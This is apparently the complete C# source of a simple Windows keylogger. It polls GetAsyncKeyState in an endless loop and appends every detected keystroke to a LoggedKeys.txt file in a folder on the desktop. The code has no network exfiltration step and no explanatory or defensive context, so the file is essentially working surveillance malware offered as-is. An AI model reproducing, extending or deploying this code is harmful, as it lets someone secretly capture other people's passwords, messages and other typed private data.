using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.IO;
using System.Threading;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace Keylogger
{
    class Program
    {
        [DllImport("user32.dll",EntryPoint ="GetAsyncKeyState")]
        private static extern short GetAsyncKeyState(System.Int32 i);

        static void Main(string[] args)
        {
            string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            folderPath = folderPath + @"\LogsFolders\";

            if (!Directory.Exists(folderPath))
            {
                Directory.CreateDirectory(folderPath);
            }

            string filePath = (folderPath + @"LoggedKeys.txt");

            if (!File.Exists(filePath))
            {
                using (StreamWriter sw = File.CreateText(filePath))
                {

                }
            }

            KeysConverter converter = new KeysConverter();
            string text = "";

            while (true)
            {
                Thread.Sleep(20);

                for(Int32 i=1; i < 2000; i++)
                {
                    
                        int key =GetAsyncKeyState(i);

                        if (key == 1 || key == -32767)
                        {
                            text = converter.ConvertToString(i);
                            using (StreamWriter sw = File.AppendText(filePath))
                            {
                                sw.WriteLine(text);

                            }
                            break;
                        }
                   
                }

                
            }

        }
    }
}
